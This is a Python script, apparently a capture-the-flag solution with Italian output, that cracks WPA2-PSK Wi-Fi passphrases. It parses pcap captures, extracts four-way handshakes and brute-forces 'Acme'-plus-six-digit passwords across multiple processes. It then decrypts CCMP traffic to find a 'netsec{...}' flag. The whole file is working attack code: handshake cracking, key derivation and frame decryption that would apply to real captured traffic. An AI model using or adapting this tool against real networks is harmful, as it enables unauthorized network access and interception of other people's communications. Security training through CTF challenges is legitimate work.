import hashlib, hmac, struct, sys, glob, os, re
from multiprocessing import Pool
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESCCM
    HAVE_CRYPTO=True
except Exception:
    HAVE_CRYPTO=False

def find_pcap():
    if len(sys.argv)>1 and os.path.exists(sys.argv[1]): return sys.argv[1]
    c=sorted(glob.glob('*.pcap')+glob.glob('*.pcapng'))
    if not c: print("Nessun file .pcap/.pcapng nella cartella."); sys.exit(1)
    return c[0]
PCAP=find_pcap()

def load_dot11(path):
    d=open(path,'rb').read(); magic=d[:4]; raw=[]; fmt="?"
    if magic in (b'\xd4\xc3\xb2\xa1', b'\xa1\xb2\xc3\xd4', b'\x4d\x3c\xb2\xa1', b'\xa1\xb2\x3c\x4d'):
        fmt="pcap"; le=magic in (b'\xd4\xc3\xb2\xa1', b'\x4d\x3c\xb2\xa1'); e='<' if le else '>'
        lt=struct.unpack(e+'I', d[20:24])[0]; off=24
        while off+16<=len(d):
            incl=struct.unpack(e+'IIII', d[off:off+16])[2]; off+=16
            raw.append((lt, d[off:off+incl])); off+=incl
    elif magic==b'\x0a\x0d\x0d\x0a':
        fmt="pcapng"; off=0; e='<'; cur=127
        while off+12<=len(d):
            bt=struct.unpack('<I', d[off:off+4])[0]
            if bt==0x0A0D0D0A: e='<' if d[off+8:off+12]==b'\x4d\x3c\x2b\x1a' else '>'
            bl=struct.unpack(e+'I', d[off+4:off+8])[0]
            if bl<12: break
            body=d[off+8:off+bl-4]
            if bt==1: cur=struct.unpack(e+'H', body[0:2])[0]
            elif bt==6:
                cap=struct.unpack(e+'I', body[12:16])[0]; raw.append((cur, body[20:20+cap]))
            elif bt==3:
                ol=struct.unpack(e+'I', body[0:4])[0]; raw.append((cur, body[4:4+ol]))
            off+=bl
    else:
        print("Formato non riconosciuto, magic =", magic.hex()); sys.exit(1)
    out=[]; lts=set()
    for lt,pkt in raw:
        lts.add(lt)
        if lt==105: out.append(pkt)
        else:
            if len(pkt)<4: continue
            out.append(pkt[struct.unpack('<H', pkt[2:4])[0]:])
    return out, fmt, lts

FRAMES, FMT, LTS = load_dot11(PCAP)
def macs(b): return ':'.join('%02x'%x for x in b)

ssid_map={}
for f in FRAMES:
    if len(f)<36: continue
    if ((f[0]>>2)&3)==0 and ((f[0]>>4)&0xf) in (8,5):
        b=macs(f[16:22]); bb=f[36:]; q=0
        while q+2<=len(bb):
            tag=bb[q]; ln=bb[q+1]; val=bb[q+2:q+2+ln]
            if tag==0:
                if val and b not in ssid_map: ssid_map[b]=val.decode('utf-8','replace')
                break
            q+=2+ln

def eapol_key(f):
    if len(f)<2 or ((f[0]>>2)&3)!=2: return None
    st=(f[0]>>4)&0xf; tods=f[0]&1; fromds=(f[0]>>1)&1
    hdr=24+(6 if tods and fromds else 0)+(2 if st&0x8 else 0)
    p=f[hdr:]
    if p[:6]!=b'\xaa\xaa\x03\x00\x00\x00' or p[6:8]!=b'\x88\x8e': return None
    x=p[8:]; ln=struct.unpack('>H',x[2:4])[0]; body=x[4:4+ln]
    ki=struct.unpack('>H',body[1:3])[0]
    full=bytearray(x[:4+ln]); full[81:97]=b'\x00'*16
    return ki,f[4:10],f[10:16],f[16:22],body[13:45],body[77:93],bytes(full)

data_tx=set()
for f in FRAMES:
    if len(f)<2 or ((f[0]>>2)&3)!=2 or not (f[1]&0x40): continue
    data_tx.add(f[10:16].hex())

m1={}; HS=[]
for f in FRAMES:
    k=eapol_key(f)
    if not k: continue
    ki,a1,a2,a3,nonce,mic,full=k
    if (ki&0x080) and not (ki&0x100):
        m1[(a2.hex(),a1.hex())]=nonce
    elif (ki&0x100) and not (ki&0x200) and (ki&0x008):
        an=m1.get((a1.hex(),a2.hex()))
        if an is not None:
            HS.append(dict(ap=a1,sta=a2,ssid=ssid_map.get(macs(a3)),anonce=an,snonce=nonce,mic=mic,eapol=full))

print("File:", PCAP, "| formato:", FMT, "| linktype:", sorted(LTS))
print("Reti:", ssid_map)
print("Handshake M1+M2:", [(h['ssid'], macs(h['sta']), "trasmette-dati" if h['sta'].hex() in data_tx else "no-dati") for h in HS])

targets=[h for h in HS if h['sta'].hex() in data_tx and h['ssid']]
if not targets: targets=[h for h in HS if h['ssid']]

BYSSID={}
for h in targets:
    AP=h['ap']; STA=h['sta']
    B=min(AP,STA)+max(AP,STA)+min(h['anonce'],h['snonce'])+max(h['anonce'],h['snonce'])
    BYSSID.setdefault(h['ssid'], []).append((B,h['eapol'],h['mic']))
SSIDS=[(s.encode(), lst) for s,lst in BYSSID.items()]

def prf(pmk,B,n):
    r=b'';i=0
    while len(r)<n: r+=hmac.new(pmk,b"Pairwise key expansion"+b'\x00'+B+bytes([i]),hashlib.sha1).digest();i+=1
    return r[:n]

def tk_table(passphrase):
    pc={}; TK={}
    for h in HS:
        if not h['ssid']: continue
        if h['ssid'] not in pc:
            pc[h['ssid']]=hashlib.pbkdf2_hmac('sha1',passphrase.encode(),h['ssid'].encode(),4096,32)
        AP=h['ap']; STA=h['sta']
        B=min(AP,STA)+max(AP,STA)+min(h['anonce'],h['snonce'])+max(h['anonce'],h['snonce'])
        TK[STA.hex()]=prf(pc[h['ssid']],B,48)[32:48]
    return TK

def decrypt(f,tk):
    fc=struct.unpack('<H',f[0:2])[0]; st=(fc>>4)&0xf; tods=fc&1; fromds=(fc>>1)&1
    hdr=24+(6 if tods and fromds else 0); tid=0
    if st&0x8: tid=struct.unpack('<H',f[hdr:hdr+2])[0]&0x0f; hdr+=2
    a1,a2,a3=f[4:10],f[10:16],f[16:22]
    c=f[hdr:hdr+8]; pn=bytes([c[7],c[6],c[5],c[4],c[1],c[0]])
    nonce=bytes([tid])+a2+pn; sc=struct.unpack('<H',f[22:24])[0]&0x000f
    aad=bytes([f[0]&0x8f,f[1]&0xc7])+a1+a2+a3+struct.pack('<H',sc)
    if tods and fromds: aad+=f[24:30]
    if st&0x8: aad+=bytes([tid,0])
    return AESCCM(tk,8).decrypt(nonce,f[hdr+8:],aad)

def find_flag(passphrase):
    if not HAVE_CRYPTO: return None
    TK=tk_table(passphrase)
    for f in FRAMES:
        if len(f)<2 or ((f[0]>>2)&3)!=2 or not (f[1]&0x40): continue
        a1,a2=f[4:10].hex(),f[10:16].hex()
        sta=a2 if a2 in TK else (a1 if a1 in TK else None)
        if not sta: continue
        try: pt=decrypt(f,TK[sta])
        except Exception: continue
        m=re.search(rb'netsec\{[^}]*\}',pt)
        if m: return m.group().decode(), sta
    return None

BATCH=2000
def scan(start):
    out=[]
    for n in range(start,start+BATCH):
        pw=b'Acme%06d'%n
        for ssidb,lst in SSIDS:
            pmk=hashlib.pbkdf2_hmac('sha1',pw,ssidb,4096,32)
            for B,eapol,mic in lst:
                if hmac.new(prf(pmk,B,16),eapol,hashlib.sha1).digest()[:16]==mic:
                    out.append((n,ssidb.decode())); break
    return out

if __name__=='__main__':
    import time
    print("\nCrack Acme+6cifre sui client che trasmettono dati, SSID:", [s.decode() for s,_ in SSIDS])
    t0=time.time(); seen=set()
    with Pool() as pool:
        for j,matches in enumerate(pool.imap(scan, range(0,1000000,BATCH))):
            for n,ssid in matches:
                pw='Acme%06d'%n
                if pw in seen: continue
                seen.add(pw)
                print("  passphrase trovata:",pw,"(SSID",ssid,")")
                r=find_flag(pw)
                if r:
                    print("\n*** FLAG:",r[0]," | passphrase:",pw," | SSID:",ssid," | client:",r[1]," [%.0fs] ***"%(time.time()-t0))
                    pool.terminate(); sys.exit(0)
            if j%20==0: print("  provati %d/1000000 (%.0fs)"%((j+1)*BATCH,time.time()-t0),flush=True)
    print("Scansione completata. Passphrase trovate:",seen)
